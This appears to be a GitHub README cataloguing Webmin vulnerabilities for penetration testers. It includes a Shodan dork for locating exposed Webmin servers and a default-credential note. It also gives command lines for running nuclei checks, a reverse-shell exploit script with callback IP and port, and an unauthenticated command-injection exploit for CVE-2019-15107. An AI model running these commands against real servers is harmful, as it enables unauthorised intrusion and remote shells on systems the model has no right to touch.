<h1 align="center">
  <br>
  <a href=""><img src="/img/logo.png" alt="" width="400px;"></a>
  <br>
  <img src="https://img.shields.io/badge/PRs-welcome-blue">
  <img src="https://img.shields.io/github/last-commit/kh4sh3i/DevSecOps">
  <img src="https://api.codacy.com/project/badge/Grade/e5fd334a431848dcb6ecdb3784fb5dfb">
  <a href="https://twitter.com/intent/follow?screen_name=kh4sh3i_"><img src="https://img.shields.io/twitter/follow/kh4sh3i_?style=flat&logo=twitter"></a>
  <a href="https://github.com/kh4sh3i"><img src="https://img.shields.io/github/stars/kh4sh3i?style=flat&logo=github"></a>
</h1>

# Webmin CVE 
a Curated list of Webmin vulnerability for penetration tester



## What is Webmin?
Webmin is a web-based interface for system administration for Unix. Using any modern web browser, you can setup user accounts, Apache, DNS, file sharing and much more.


## Shodan Dork
```
http.html:"webmin"
```

## default credential
root:unix_root_password
You should be able to login as root, using the same password as the root Unix user on your Linux system. However, if you change the Unix root password in future the Webmin root user will not change. This is because the package install just copies the current password from the /etc/shadow file.

## installing url
```
 http://_your-systems-hostname_:10000/
```


## CVE-2022-0824
Improper Access Control to Remote Code Execution in GitHub repository webmin/webmin prior to 1.990.
Webmin 1.984 and below - File Manager privilege exploit (CVE-2022-0824 and CVE-2022-0829)
Less privileged Webmin users who do not have any File Manager module restrictions configured can access files with root privileges, if using the default Authentic theme


```
nuclei -u target.com:1000 -t CVE-2022-0824.yaml -v -V username=username -V password=password

python3 Webmin-revshell.py -t [TARGET] -c [CREDENTIAL] -LS [PY3HTTP_SERVER] -L [CALLBACK_IP] -P [CALLBACK_PORT]
```



## CVE-2022-36446
software/apt-lib.pl in Webmin before 1.997 lacks HTML escaping for a UI command.

```
nuclei -u target.com:1000 -t CVE-2022-36446.yaml -v -V username=username -V password=password
```


## CVE-2019-15107
An issue was discovered in Webmin <=1.920. The parameter old in password_change.cgi contains a command injection vulnerability.

```
python2 CVE_2019_15107.py https://target-ip:10000 cmd
```



## references
* [CVE-2022-0824](https://nvd.nist.gov/vuln/detail/cve-2022-0824)
* [installing webmin](https://doxfer.webmin.com/Webmin/Installing_Webmin)
* [Webmin Security Vulnerabilities](https://www.cvedetails.com/vulnerability-list/vendor_id-358/Webmin.html)
* [CVE-2022-36446](https://www.tenable.com/cve/CVE-2022-36446)
* [CVE-2019-15107 Webmin RCE <=1.920 (unauthorized)](https://github.com/jas502n/CVE-2019-15107)
* [Webmin-CVE-2022-0824-revshell](https://github.com/faisalfs10x/Webmin-CVE-2022-0824-revshell)